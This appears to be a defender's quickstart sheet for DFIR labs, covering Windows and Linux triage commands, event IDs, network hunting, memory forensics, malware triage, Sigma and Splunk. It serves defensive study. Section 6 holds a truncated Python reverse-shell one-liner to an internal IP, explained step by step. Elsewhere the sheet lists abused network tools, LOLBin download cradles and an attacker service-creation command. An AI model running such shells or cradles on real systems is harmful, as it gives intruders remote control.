# DFIR Lab: Quickstart Sheet
This is a DFIR lab quickstart reference sheet. It’s not meant to be a complete guide or a full cheat sheet, but a practical launchpad if you want to jump straight into hands-on labs without getting bogged down in theory.

Use it to orient yourself quickly, then build your own version as you go-add commands, artifacts, and patterns you’ve actually used. Your personal notes will always beat any generic cheat sheet.

---

## 0) Fast Hunt Flow (10–60 min)

1. **Scope**: asset(s), time window, suspected vector.
    
2. **Windows quick triage**
    
    - Admins: `net localgroup administrators`
        
    - Processes: `tasklist /v`
        
    - Net: `netstat -ano` -> map PIDs to `tasklist`
        
    - Autoruns: Sysinternals Autoruns (Logon, Services, Scheduled Tasks tabs)
        
    - Events: Security 4688/4624/4625/4648/4672; System 7045; Task 4698–4702; LSM 24/25/39; RDP 1149
        
    - Artifacts: Prefetch / Amcache / JumpLists / LNK / SRUM
        
3. **Linux quick triage**
    
    - Sessions: `last -ai` / `lastb`, `who`, `w`
        
    - Processes: `ps auxf`, `lsof -i -nP`, `ss -lntp`
        
    - Persistence: cron / systemd / `authorized_keys`
        
    - Logs: `journalctl -b`, `/var/log/auth.log` or `/var/log/secure`
        
4. **Network**: BPF/tcpdump capture + Wireshark/tshark; look for beaconing, SNI anomalies, DNS weirdness.
    
5. **Malware**: hash + strings -> PE triage (PEStudio / CAPA) -> sandbox (Procmon / TCPView / Regshot / Fiddler).


---

## 1) Windows - Execution & User Activity Artifacts

|Artifact|What it shows|Where|Parse / Tools|Notes|
|---|---|---|---|---|
|**Amcache.hve**|Program execution/install traces + SHA-1|`C:\Windows\AppCompat\Programs\Amcache.hve`|AmcacheParser|Great for first-seen execution timelines.|
|**ShimCache/AppCompatCache**|Evidence of run/seen executables|`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache`|AppCompatCacheParser; Volatility shimcachemem|Persisted at shutdown; not proof of _successful_ exec alone.|
|**Prefetch**|Run-count, first/last run, file list|`C:\Windows\Prefetch\*.pf`|PECmd|Often disabled on servers; still check.|
|**UserAssist**|GUI app launches (per user)|`NTUSER.DAT\...\Explorer\UserAssist\...`|RegRipper, UserAssist parser|No CLI programs here.|
|**LNK**|Open/exec targets|`...\Users\<u>\AppData\Roaming\Microsoft\Windows\Recent\*.lnk`|LECmd, Windows File Analyzer|Timestamps, volume GUIDs.|
|**JumpLists**|Per-app file usage (AppIDs)|`...\Recent\AutomaticDestinations\` / `CustomDestinations\`|JLECmd|Pinned/recent docs per app.|
|**SRUM**|App/net usage timeline per process|`C:\Windows\System32\sru\SRUDB.dat`|SrumECmd / srum-dump|Great for lateral movement timing.|
|**BAM/DAM**|Execution tracking (recent)|BAM/DAM keys under `HKLM\SYSTEM\...`|Registry viewers|Useful on recent Windows 10/11.|
|**USN Journal**|File-level change timeline|`$Extend\$UsnJrnl:$J`|MFTECmd / UsnJrnl parsers|Complements MFT timelines.|
|**WER**|Crash reports (modules/paths)|`C:\ProgramData\Microsoft\Windows\WER\`|Text tools|Crash paths can reveal malware.|
|**RDP client**|Targets/MRU|`HKCU\Software\Microsoft\Terminal Server Client\Servers`|`reg.exe`|Pair with server-side events.|
|**PuTTY**|SSH hosts|`HKCU\Software\SimonTatham\PuTTY\SshHostKeys`|`reg.exe`|Windows SSH pivots.|
|**Sysmon related Registry Keys**|Execution of Sysinternals programs|`HKCU\Software\Sysinternals\<tool_name>\EulaAccepted`|`reg.exe`|EULA must be accepted when the tool is run, which creates a registry key (evidence the tool ran at least once).|
|**USERDAT**|Search terms|`Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery`|RegRipper, UserAssist||

**Execution Event IDs to prioritize**:

- Security **4688**
    
- Sysmon **1 / 7 / 8 / 10 / 11 / 13 / 22**
    

---

## 2) Windows - Accounts & Authentication (incl. RDP)

Core commands:

`net users net user <username> net localgroup net localgroup <groupname> Get-LocalUser Get-LocalGroup`

**Key Security events**

- **4624** logon success (Types: 2 interactive, 3 network, **7 unlock/reconnect**, **10 RDP**)
    
- **4625** failure (check SubStatus)
    
- **4648** explicit credentials (client-side RDP)
    
- **4634/4647** logoff
    
- **4672** special privileges
    
- **4768/4769/4771** Kerberos
    
- **4776** NTLM
    
- **4740** lockout
    
- **4720/4726** user add/del
    
- **4728/4732/4735/4737** group changes
    

**RDP breadcrumb map**

- **Client**: 4648 (explicit creds).
    
- **Server**:
    
    - `Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational` **1149** (GUI presented)
        
    - Security **4624** Type **10** (or **7** on reconnect)
        
    - `LocalSessionManager` **24** (disconnect), **39** (proper disconnect), **25** (reconnect)
        
    - 4778/4779 reconnect/disconnect
        

---

## 3) Windows - Services, Tasks, Registry Persistence

### Services

- Registry: `HKLM\SYSTEM\CurrentControlSet\Services\<Name>` -> `ImagePath`
    
- Events: System **7045** (service install), Security **4697** (if audited)
    
- Enum: `sc query type= service state= all`
    
- Creation (attacker favorite):
    

`sc create <name> binPath= "<exe>" start= auto`

### Scheduled Tasks

- Files: `C:\Windows\System32\Tasks\`
    
- Registry: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`
    
- Events (Win10+ Security): **4698** create, **4702** update, **4699** delete, **4700/4701** enable/disable
    
    - Win7/2008R2: 106/140/141
        
- Enum:
    

`schtasks /query /V /FO LIST`

### Registry Run/Winlogon & other autoruns

`HKCU\Software\Microsoft\Windows\CurrentVersion\Run HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce HKLM\Software\Microsoft\Windows\CurrentVersion\Run HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  Startup folders: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup  IFEO Debugger: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<exe>\Debugger  WMI persistence: ROOT\subscription (EventFilter -> Consumer -> Binding)`

### Office autoload

- Word: `%APPDATA%\Microsoft\Word\Startup\`
    
- Excel: `%APPDATA%\Microsoft\Excel\XLSTART\` (.xlam, .xll)
    

---

## 4) Windows - PowerShell, LOLBins, Quick Triage

### PowerShell logs

(Enable via GPO/Defender ASR for script logging.)

- `Microsoft-Windows-PowerShell/Operational`:
    
    - 400/403 (engine)
        
    - **4103** (module)
        
    - **4104** (script-block)
        
- Transcription (if enabled):  
    `%USERPROFILE%\Documents\PowerShell_transcript\…`
    

### LOLBins to watch

- `powershell.exe` / `pwsh.exe` (encoded/download cradle)
    
- `mshta.exe` (remote HTA)
    
- `wscript.exe` / `cscript.exe`
    
- `rundll32.exe` (DLL export)
    
- `regsvr32.exe /i:http … scrobj.dll`
    
- `certutil.exe` (download/decode)
    
- `bitsadmin.exe`
    
- `msiexec.exe`
    
- `wmic.exe`
    
- `cmstp.exe`
    
- `installutil.exe`
    

### Quick triage snippet

`tasklist /v netstat -ano Get-NetTCPConnection | ? { $_.State -eq 'Listen' } | ft -Auto sc query type= service state= all schtasks /query /V /FO LIST net localgroup administrators wevtutil qe Security /q:"*[System[(EventID=4624 or EventID=4625 or EventID=4672 or EventID=4688)]]" /c:50 /f:text /rd:true`

---

## 5) Linux - Accounts, Processes, Network, Persistence, Logs

### Accounts & sessions

`who w users last -ai            # /var/log/wtmp lastb               # /var/log/btmp lastlog id <user> groups <user> getent passwd getent group`

Auth logs:

- Debian/Ubuntu: `/var/log/auth.log`
    
- RHEL/CentOS: `/var/log/secure`
    

### Network

`ss -lntp            # preferred modern tool netstat -plant      # older systems lsof -i -nP ip a ip r iptables -L -n -v   # or: nft list ruleset tcpdump -i any -nn -s0`

**Network CLI commands (often abused / useful):**

`apt aria2c axel busybox curl git http lftp nc netcat node nodejs npm openssl perl php pip python python3 python3 -m http.server rsync scp sftp smbclient smbget svn telnet transmission-cli wget yum dnf apk`

### Processes & files

`ps auxf ps -eo lstart,pid,user,args --sort=start_time lsof -p <PID> cat /proc/<PID>/cmdline cat /proc/<PID>/environ | tr '\0' '\n'`

### Persistence

`# Cron crontab -l                  # current user crontab -l -u <user> ls -la /etc/cron* ls -la /var/spool/cron/ ls -la /var/spool/cron/crontabs  # systemd systemctl list-timers --all ls -la /etc/systemd/system/ ls -la ~/.config/systemd/user/  # SSH & shell ls -la ~/.ssh/authorized_keys grep -i '^PermitRootLogin' /etc/ssh/sshd_config ls -la /etc/rc.local /etc/profile.d/ ~/.bashrc ~/.profile`

### File discovery & integrity

`find /home/* -type f -mtime -2 find /var/www/html -type f -name '*.php' -mtime +5 find . -newermt "2020-12-01 00:00:00" ! -newermt "2020-12-02 00:00:00" stat <file> sha256sum <file>  # SUID & capabilities find / -perm -4000 -type f -xdev -print 2>/dev/null getcap -r / 2>/dev/null`

### auditd & journald

`journalctl -b journalctl --since "2025-08-01" --until "2025-08-17" journalctl -u ssh -p err -b -n 200  auditctl -l auditctl -w /path -k watch_name ausearch -k watch_name echo "-w /path -p rwxa -k watch_name" | sudo tee -a /etc/audit/rules.d/audit.rules augenrules --load`

### Docker

`docker ps -a docker logs <container> > out.log docker inspect <container> docker exec -it <container> /bin/sh`

---

## 6) Network Hunting - BPF, tcpdump, Wireshark/tshark, Zeek, RITA

### BPF filters

`host 1.2.3.4 port 3389 net 10.0.0.0/8 tcp[13] & 2 != 0             # SYN set tcp[13] == 2                 # SYN only ip[2:2] > 20 && ip[2:2] < 100 not (arp or icmp or port 53)`

### tcpdump essentials

`sudo tcpdump -i any -nn -s0 -w cap.pcap sudo tcpdump -r cap.pcap 'tcp[13] == 2 and port 445' sudo tcpdump -vvnnAls0 'http' | grep -i -A5 -B5 'User-Agent:' sudo tcpdump -tttt -r cap.pcap`

### Wireshark display filters

- `http.request`
    
- `dns.qry.name contains "example.com"`
    
- `tcp.flags.syn==1 && tcp.flags.ack==0`
    
- `tls.handshake.extensions_server_name`
    
- `kerberos.CNameString`
    

### Wireshark - identify port scanning

ICMP Timestamp requests:

`icmp.type==13`

“Mini pings”:

`icmp`

**TCP heuristic**

`tcp.flags.syn # Statistics > Endpoints > TCP > Packets x2 > Limit to display filter`

Look for the same port being reused many times from the same host (classic scanning pattern).

Then:

`# Found scanner IP: Statistics > Conversations > TCP > Port`

to identify port range.

### Identify type of port scan

Each type of scan has a characteristic pattern.

- **TCP SYN Scan (Stealth)**
    
    - Pattern: SYNs to many ports.
        
    - Responses:
        
        - Open -> SYN/ACK (scanner often sends RST).
            
        - Closed -> RST/ACK.
            
    - In Wireshark: lots of SYNs from one source IP to many destination ports without full handshakes.
        
- **TCP Connect Scan**
    
    - Pattern: Full 3-way handshakes.
        
    - In Wireshark: SYN -> SYN/ACK -> ACK, then immediate FIN/RST.
        
- **TCP FIN Scan**
    
    - Pattern: FIN packets to ports.
        
    - Responses: closed -> RST; open -> usually no response.
        
    - In Wireshark: isolated FINs to many ports, no SYNs.
        
- **TCP Xmas Scan**
    
    - Pattern: FIN + PSH + URG flags set.
        
    - Responses: similar to FIN scan.
        
    - In Wireshark: odd flag combos in TCP header.
        
- **TCP Null Scan**
    
    - Pattern: packets with no flags set (`Flags: 0x0000`).
        
- **UDP Scan**
    
    - Pattern: UDP to many ports.
        
    - Responses: closed -> ICMP Port Unreachable; open -> silence or app response.
        

**Helpful display filters**

`# SYN-only tcp.flags.syn==1 && tcp.flags.ack==0  # FIN-only tcp.flags.fin==1 && tcp.flags.syn==0 && tcp.flags.ack==0  # Null tcp.flags==0x000  # Xmas tcp.flags.fin==1 && tcp.flags.psh==1 && tcp.flags.urg==1  # UDP with ICMP port unreachable replies icmp.type==3 && icmp.code==3`

If RSTs are from the **target**, most ports are closed.  
If RSTs are from the **scanner**, you’re likely seeing a SYN (half-open) scan.

### Example reverse shell snippet (Python)

`python -c 'import socket,subprocess,os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.251.96.4", 4422)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(... # truncated in lab notes '`

> Note: the snippet is intentionally truncated - a classic reverse shell usually also duplicates to `2` and then spawns a shell, e.g. `subprocess.call(["/bin/sh","-i"])`.

**What each piece does (summary)**

- `python -c '...'` - run inline Python.
    
- `import socket, subprocess, os` - networking, process spawn, fd ops.
    
- `socket.socket(...)` / `s.connect(...)` - build TCP connection back to attacker.
    
- `os.dup2(...)` - redirect stdin/stdout/stderr to the socket.
    
- `subprocess.call(["/bin/sh","-i"])` - interactive shell over that socket.
    

**Net effect**: attacker gets an interactive shell on the victim, over the reverse connection.

### tshark cheats

`tshark -nr file.pcap -Y 'http.request' -T fields -e frame.time -e ip.src -e http.host -e http.request.uri | sort -u tshark -nr file.pcap -qz conv,ip tshark -nr file.pcap -qz io,phs tshark -nr file.pcap -qz follow,tcp,ascii,40`

### Zeek logs you want

- `conn.log`, `dns.log`, `http.log`, `ssl.log` / `x509.log`, `files.log`, `notice.log`
    

**RITA**: beaconing / long-conn analytics over Zeek data.

**PowerShell Empire URIs** (examples)

`/admin/get.php /login/process.php /news.php`

**Zeek / PCAPs for RITA**

`sudo ./zeek -r /home/ubuntu/<pcap> local "Log::default_rotation_interval = 1 day"`

**Create dataset in RITA**

`rita import /home/ubuntu/<folder-with-zeek-logs> RITALab`

**Launch RITA web GUI**

`sudo rita hmtl-report+`

### C2 Traffic Detection - quick checklist

Look for:

- Beaconing / periodic callbacks
    
- Small, regular packets (heartbeats)
    
- Unusual DNS (long/random subdomains, TXT/NULL answers, many NXDOMAIN)
    
- Odd TLS (self-signed, strange SNI, unusual JA3)
    
- HTTP(S) anomalies (weird user-agents, repetitive URIs, encoded payloads, long polling)
    
- Tunnelling over ICMP/SMB/other protocols
    
- Unusual ports / services
    
- High-entropy payloads
    
- Rare or newly registered domains / dynamic DNS
    
- Multiple hosts talking to a single external C2
    

**Wireshark GUI helpers**

- **Statistics -> IO Graphs** - periodic beacons.
    
- **Statistics -> Conversations / Endpoints** - unusual endpoints or long-lived flows.
    
- **Statistics -> Protocol Hierarchy** - unexpected protocol mix.
    
- **Analyze -> Expert Information** - anomalies.
    
- **Statistics -> Flow Graph** - visualize flows.
    
- **Follow -> TCP/UDP/HTTP Stream** - inspect payloads.
    

**Use the TCP payload length field**

- `tcp.len == 1` - TCP segments with 1-byte payloads.
    

**UDP length**

UDP header `length` = header (8 bytes) + payload.

- 1-byte UDP payload -> `udp.length == 9`.
    

**General IP/TCP/UDP filters**

- Only traffic to/from an IP: `ip.addr == 1.2.3.4`
    
- TCP flows with data: `tcp.len > 0` (combine with analysis fields)
    

**HTTP(S)**

- Suspicious URIs:
    
    - `http.request.uri contains "/api/"`
        
    - `http.request.full_uri contains "randomstring"`
        
- User-agents:
    
    - `http.user_agent contains "python"`
        
    - `http.user_agent contains "curl"`
        

TLS handshakes: `tls.handshake.type == 1`

**DNS**

- Long/suspicious: `dns.qry.name matches "[a-z0-9]{20}"`
    
- TXT: `dns.txt`
    
- NXDOMAIN: `dns.flags.rcode == 3`
    

**ICMP / Other encapsulation**

- ICMP tunnelling candidates: `icmp`
    
- SMB to weird external IPs: `smb and ip.addr == x.x.x.x`
    

**Encrypted traffic heuristics**

- Very small TLS app-data packets at regular intervals: `tls.record.version && frame.len < 200` (then check timing).
    

---

## 7) Memory & Disk Forensics (quick wins)

### Memory (Volatility 3)

`vol3 -f mem.vmem windows.info vol3 -f mem.vmem windows.pslist vol3 -f mem.vmem windows.psscan vol3 -f mem.vmem windows.cmdline vol3 -f mem.vmem windows.netscan vol3 -f mem.vmem windows.malfind vol3 -f mem.vmem windows.dlllist --pid <PID> vol3 -f mem.vmem windows.registry.printkey --key "Software\\Microsoft\\Windows\\CurrentVersion\\Run"`

### Disk timelines

- **$MFT** -> MFTECmd (CSV) -> sort by timestamps (cr/ma/mo).
    
    - You can also derive `ReferrerURL` in Timeline Explorer.
        
- **USN Journal ($J)** for file change deltas in the period of interest.
    
- **EVTX**: Chainsaw fast-hunt + Sigma mappings.
    
- **KAPE**: triage collection + EZ Tools (Prefetch, Amcache, LNK/Jump, SRUM, MFT/USN, EVTX).
    

---

## 8) Malware Triage & Analysis

### Static -> Dynamic -> Hybrid (fast path)

1. Hash/metadata (`sha256sum`, pefile, exiftool)
    
2. Strings (Sysinternals `strings.exe`)
    
    - Example:  
        `C:\tools\strings.exe -n 5 C:\path\to\malware.exe > C:\analysis\malware_strings.txt`
        
3. PE triage (PEStudio, DIE, Resource Hacker, CAPA)
    
4. Cloud checks (VirusTotal, Hybrid Analysis, Joe Sandbox)
    
5. Dynamic (isolated VM): Procmon, TCPView, Autoruns, Regshot, Fiddler, Wireshark
    
6. YARA (manual or yarGen bootstrap)
    

### Win32 API themes

- **Injection**: `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`
    
- **Persistence**: `CreateService`, `RegSetValueEx`
    
- **C2/downloader**: `URLDownloadToFile`, `WinHttpOpen/Connect/Send/Receive`
    
- **Crypto**: `CryptAcquireContext`, AES routines
    

### YARA skeleton

`rule sample_family_tag : malware windows {   meta:     author = "BTL2"     description = "Detects Sample X"     date = "2025-08-17"   strings:     $a = "Sniffer.exe"     $b = "K:\\\\MSSniffer\\\\Release\\\\Sniffer.pdb" wide   condition:     all of them }`

Run:

`yara -r rules.yar <path> yara -rs rules.yar <path>   # show matches`

### capa (capabilities)

`capa suspicious.exe`

### Anti-analysis tells

- Sleep/time bombs
    
- VM probes (registry/devices)
    
- User-interaction checks (mouse/MRU)
    
- Sandbox evasion of network/API calls
    

### Packers

- **Definition**: Pack/compress/encrypt executables to obfuscate.
    
- **Identification**: `pestudio` (packer indicators).
    
- **Unpacking**:
    
    `./upx.exe -d "<path to file>"`
    
- **PeStudio tip**: Sort strings by file offset to see them in order as they appear in the file.
    

### Static analysis tools

- `pestudio`, `strings`, `die (Detect It Easy)`
    

### Dynamic analysis tools

- `procmon`, `Process Explorer`, `Wireshark`
    

### .NET malware

- `AssemblyTitle` & `AssemblyCompany` come from the assembly manifest and are embedded as attributes in the PE.
    

---

## Sizes & common boundaries (powers of two)

|Shortened Hex Value|Hex Value|Decimal|Significance|
|---|---|---|---|
|0x200 (512 B)|0x200|512|PE FileAlignment default; disk sector size; common chunk size.|
|0x400 (1 KiB)|0x400|1024|Small buffers; compression chunks.|
|0x800 (2 KiB)|0x800|2048|Small pages on some embedded/old systems; buffers.|
|0x1_000 (4 KiB)|0x1000|4096|Standard x86/x64 page size; section alignment in memory.|
|0x2_000 (8 KiB)|0x2000|8192|Two pages; frequent heap/stack growth steps.|
|0x4_000 (16 KiB)|0x4000|16384|Larger buffers; crypto/window sizes.|
|0x8_000 (32 KiB)|0x8000|32768|Common slab/cache step.|
|0x1_0000 (64 KiB)|0x10000|65536|Windows allocation granularity; image base alignment.|
|0x2_0000 (128 KiB)|0x20000|131072|Larger pool chunks.|
|0x4_0000 (256 KiB)|0x40000|262144|Caches, staged I/O.|
|0x8_0000 (512 KiB)|0x80000|524288|Medium buffers.|
|0x1_00000 (1 MiB)|0x100000|1048576|Default thread stack reserve (approx); paging/file mapping.|
|0x2_00000 (2 MiB)|0x200000|2097152|x86-64 large page size; TLB optimization target.|
|0x4_00000 (4 MiB)|0x400000|4194304|Typical PE32 default ImageBase multiples; big buffers.|
|0x8_00000 (8 MiB)|0x800000|8388608|Larger heaps/segments.|
|0x10_00000 (16 MiB)|0x1000000|16777216|Big pools/memory maps.|
|0x20_00000 (32 MiB)|0x2000000|33554432|Ditto.|
|0x40_00000 (64 MiB)|0x4000000|67108864|Ditto.|
|0x80_00000 (128 MiB)|0x8000000|134217728|Ditto.|
|0x100_00000 (256 MiB)|0x10000000|268435456|Ditto.|
|0x200_00000 (512 MiB)|0x20000000|536870912|Ditto.|
|0x400_00000 (1 GiB)|0x40000000|1073741824|x86-64 huge page; large mapping threshold.|
|0x800_00000 (2 GiB)|0x80000000|2147483648|32-bit user/kernel split boundary (default).|
|0xC00_00000 (3 GiB)|0xC0000000|3221225472|32-bit /3GB switch (user space up to here).|
|0x1_0000_0000 (4 GiB)|0x100000000|4294967296|32-bit addressable limit.|
|0x2_0000_0000 (8 GiB)|0x200000000|8589934592|8 GiB boundary.|
|0x4_0000_0000 (16 GiB)|0x400000000|17179869184|16 GiB boundary.|

---

## Alignment masks (page/region math)

|Shortened Hex Value|Hex Value|Decimal|Significance|
|---|---|---|---|
|0xFFF (4K-1)|0xFFF|4095|Mask: offset within 4 KiB page (`addr & 0xFFF`).|
|0xFFFF (64K-1)|0xFFFF|65535|Mask: offset within 64 KiB region.|
|0xFFFF_FFFF_FFFF_F000|0xFFFFFFFFFFFFF000|18446744073709547520|Align down to 4 KiB on x64.|

---

## Windows VirtualAlloc / memory state flags

|Flag|Hex Value|Decimal|Significance|
|---|---|---|---|
|MEM_COMMIT|0x1000|4096|Commit; pages become backed/usable.|
|MEM_RESERVE|0x2000|8192|Reserve address range without backing.|
|MEM_COMMIT \| MEM_RESERVE|0x3000|12288|Combined commit + reserve.|
|MEM_DECOMMIT|0x4000|16384|Release commit within reserved range.|
|MEM_RELEASE|0x8000|32768|Free entire reserved region.|
|MEM_FREE|0x10000|65536|Region state returned by `VirtualQuery`.|
|MEM_PRIVATE|0x20000|131072|Private (non-mapped) pages.|
|MEM_MAPPED|0x40000|262144|File/section mapping.|
|MEM_TOP_DOWN|0x100000|1048576|Prefer high addresses.|
|MEM_WRITE_WATCH|0x200000|2097152|Track writes (anti-debug/dirty tracking).|
|MEM_PHYSICAL|0x400000|4194304|Physical mapping (rare in user mode).|
|MEM_LARGE_PAGES|0x20000000|536870912|Request large pages (2 MiB or 1 GiB).|

---

## Windows page protection flags

|Flag|Hex Value|Decimal|Significance|
|---|---|---|---|
|PAGE_NOACCESS|0x01|1|No access.|
|PAGE_READONLY|0x02|2|Read only.|
|PAGE_READWRITE|0x04|4|Read/Write.|
|PAGE_WRITECOPY|0x08|8|Copy-on-write.|
|PAGE_EXECUTE|0x10|16|Execute only.|
|PAGE_EXECUTE_READ|0x20|32|Execute + Read.|
|PAGE_EXECUTE_READWRITE|0x40|64|RWX (classic for shellcode/injection).|
|PAGE_EXECUTE_WRITECOPY|0x80|128|Exec + COW.|
|PAGE_GUARD|0x100|256|Guard page (SEH/anti-debug tricks).|
|PAGE_NOCACHE|0x200|512|Disable CPU cache (rare).|
|PAGE_WRITECOMBINE|0x400|1024|Write-combine (MMIO).|

---

## Architecture & OS: key addresses and offsets (Windows)

|Name|Hex Value|Decimal|Significance|
|---|---|---|---|
|NULL|0x00000000|0|Null pointer; null-page mapping blocked by modern OS.|
|0x7FFE_0000|0x7FFE0000|2147352576|KUSER_SHARED_DATA (x86 user alias).|
|0xFFFF_F780_0000_0000|0xFFFFF78000000000|18446734727860715520|KUSER_SHARED_DATA (x64 kernel mapping).|
|Top user (x64)|0x00007FFFFFFFFFFF|140737488355327|Highest canonical user VA.|
|PEB (x86)|0x30|48|FS:[0x30] -> PEB.|
|TEB (x86)|0x18|24|FS:[0x18] -> TEB.|
|PEB (x64)|0x60|96|GS:[0x60] -> PEB.|
|TEB (x64)|0x30|48|GS:[0x30] -> TEB.|
|SEH end sentinel|0xFFFFFFFF|4294967295|End-of-chain marker in x86 SEH lists.|
|User/Kernel split (x86)|0x80000000|2147483648|Default kernel start (2 GiB).|
|/3GB user limit (x86)|0xC0000000|3221225472|Kernel start with /3GB; user up to 3 GiB.|
|Kernel start (x64, typical)|0xFFFF800000000000|18446603336221196288|Start of kernel canonical range.|

---

## PE / executable markers & defaults

|Name|Hex Value|Decimal|Significance|
|---|---|---|---|
|'MZ'|0x5A4D|23117|DOS header signature (start of PE file).|
|'PE\0\0'|0x00004550|17744|NT headers signature at `e_lfanew`.|
|`e_lfanew` offset|0x3C|60|DOS header field offset to NT headers.|
|FileAlignment|0x200|512|Default on-disk file alignment in PE.|
|SectionAlignment|0x1000|4096|In-memory section alignment.|
|PE32 ImageBase|0x00400000|4194304|Default 32-bit linker image base (subject to ASLR).|
|PE32+ ImageBase|0x140000000|5368709120|Default 64-bit linker image base (subject to ASLR).|

---

## Common fill/sentinel patterns (heap/debug/signature hunting)

|Pattern|Hex Value|Decimal|Significance|
|---|---|---|---|
|0x90|0x90|144|x86 NOP byte (NOP sleds).|
|0x90_90_90_90|0x90909090|2425393296|4-byte NOP pattern.|
|0xCC|0xCC|204|INT3 breakpoint; MSVC fills uninitialized stack with 0xCC.|
|0xCCCCCCCC|0xCCCCCCCC|3435973836|Repeated INT3 filler in dumps.|
|0xCD|0xCD|205|MSVC debug heap: freshly allocated bytes.|
|0xCDCDCDCD|0xCDCDCDCD|3452816845|32-bit version of above.|
|0xDD|0xDD|221|MSVC debug heap: freed memory bytes.|
|0xDDDDDDDD|0xDDDDDDDD|3722304989|32-bit freed pattern.|
|0xFD|0xFD|253|MSVC debug heap guard (“no-man’s-land”) bytes.|
|0xFDFDFDFD|0xFDFDFDFD|4261281277|32-bit guard pattern.|
|0xFEEE_FEEE|0xFEEEFEEE|4277075694|Windows NT heap freed block sentinel.|
|0xBAAD_F00D|0xBAADF00D|3131961357|“Bad food” sentinel for bad/uninitialized blocks.|
|0xDEAD_BEEF|0xDEADBEEF|3735928559|Classic sentinel (freed/poisoned memory).|
|0xDEAD_C0DE|0xDEADC0DE|3735929054|Sentinel used in tests/malware markers.|
|0xCAFE_BABE|0xCAFEBABE|3405691582|Java class magic; also used in various payloads/packers.|
|0x7F454C46|0x7F454C46|2135247942|ELF magic (`\x7FELF`); useful when scanning for embedded ELF.|

---

## Instruction/loop byte patterns (handy in dumps)

|Pattern|Hex Value|Decimal|Significance|
|---|---|---|---|
|0xEB_FE|0xEBFE|60414|`jmp short -2`: infinite 2-byte loop (anti-debug).|

---

### Notes & quick uses

- Page math:
    
    - `(addr & ~0xFFF)` aligns down to 4 KiB.
        
    - `(size + 0xFFF) & ~0xFFF` rounds up to next 4 KiB.
        
- RWX hunting: look for `PAGE_EXECUTE_READWRITE (0x40)` regions after `VirtualAlloc(..., 0x3000, 0x40)`.
    
- PEB/TEB: FS/GS offsets are stable; malware uses them to resolve modules/APIs without `GetProcAddress`.
    
- PE markers: `MZ` + `e_lfanew@0x3C` -> `PE\0\0` is a solid heuristic to find embedded PEs.
    
- Debug/heap sentinels (`0xFEEEFEEE`, `0xCD`, `0xDD`, `0xFD`, `0xCC`) often highlight UAF/overflow regions.
    

---

## 9) Detection Engineering - Sigma, Sysmon, OSQuery

### Sigma example (Windows process creation)

`title: Suspicious mshta Remote Execution logsource:   category: process_creation   product: windows detection:   sel:     Image|endswith: '\mshta.exe'     CommandLine|contains: 'http'   condition: sel level: high`

### Sysmon IDs (core set)

- **1** Process Create
    
- **3** Network Connect
    
- **6** Driver Loaded
    
- **7** Image Loaded
    
- **8** CreateRemoteThread
    
- **9** RawAccessRead
    
- **10** Process Access
    
- **11** File Create
    
- **12/13/14** Reg Create/Set/Rename
    
- **15** FileCreateStreamHash
    
- **16** Config Change
    
- **17/18** Named Pipes
    
- **19/20/21** WMI
    
- **22** DNS
    
- **23–25** FileDelete/Detected/Archived
    

### OSQuery quick hunts

`-- Windows SELECT * FROM processes   WHERE name IN ('powershell.exe','pwsh.exe','cmd.exe','mshta.exe'); SELECT * FROM listening_ports; SELECT * FROM services WHERE status='RUNNING'; SELECT * FROM scheduled_tasks; SELECT * FROM startup_items; SELECT * FROM registry   WHERE path LIKE 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run%';  -- Linux SELECT * FROM crontab; SELECT * FROM processes WHERE on_disk = 0; SELECT * FROM listening_ports;`

**Coverage tools**: ATT&CK Navigator, DeTT&CT, Chainsaw (EVTX), KAPE + EZ Tools (triage).

---

## 10) File Types / Extensions of Interest

- **PEs**: `.exe` `.dll` `.sys` `.drv` `.ocx` `.scr`
    
- **Scripts**: `.ps1` `.psm1` `.bat` `.cmd` `.vbs` `.js` `.jse` `.wsf` `.hta` `.psd1`
    
- **Office active**: `.docm` `.dotm` `.xlsm` `.xlam` `.xll` `.pptm`
    
- **Containers**: `.zip` `.rar` `.7z` `.iso` `.img`
    
- **Shortcuts/misc**: `.lnk` `.url` `.scf` `.chm` `.sct`
    

---

## 11) Splunk

Basic pattern:

`index=<dataset> earliest=0`

**Interesting fields**

- High-cardinality fields like `Account_Name`, `Image`, etc.
    
- `source` - where data is coming from.
    

### Wildcards

- Operator `*` (wildcard):
    

`search dst="10.1.1.*" search pass* AND fail*`

Examples:

- `"pass" "fail"`
    
- `"password" "fail"`
    
- `"pass" "failure"`
    
- `"password" "failure"`
    

### Searching for processes

`index="botsv1" earliest=0 Image="*\\cmd.exe" | stats values(CommandLine) by host`

- `Image=` (Sysmon) shows executable path.
    
- This finds `cmd.exe` anywhere and lists commands per host.
    

### Sort

`| sort time asc | sort limit=2 time asc   # first two events`

### Stats

`| stats count by srcip | sort count desc`

### Table

`| table date time srcip dstport action msg`

### uniq / dedup

`| table srcip | uniq | table action | dedup action`

### View source types

`| metadata type=sourcetypes | table sourcetype | sort sourcetype`

### Confirm types of sources

`index=botsv1 earliest=0 | stats count by source`

### Check DNS

`index=botsv1 earliest=0 sourcetype=stream:dns`

### Detecting C2 traffic with visualization

**Timeline:**

`index=<index> event_description="<DNS related>" QueryName!="*exclusions*.com" | table _time QueryName`

**Pie chart:**

`index=<index> event_description="<DNS related>" QueryName!="*exclusions*.com" | stats count by QueryName | sort -count`

**All queries:**

`index=<index> event_description="<DNS related>" QueryName!="*exclusions*.com"`

Then in the UI: **Visualization -> New Pivot -> Area Chart** and save as needed.

---

## 12) Appendices - Event IDs (quick map)

### Authentication & logon

- **4624** success (Types 2,3,7,10)
    
- **4625** failure (Status/SubStatus)
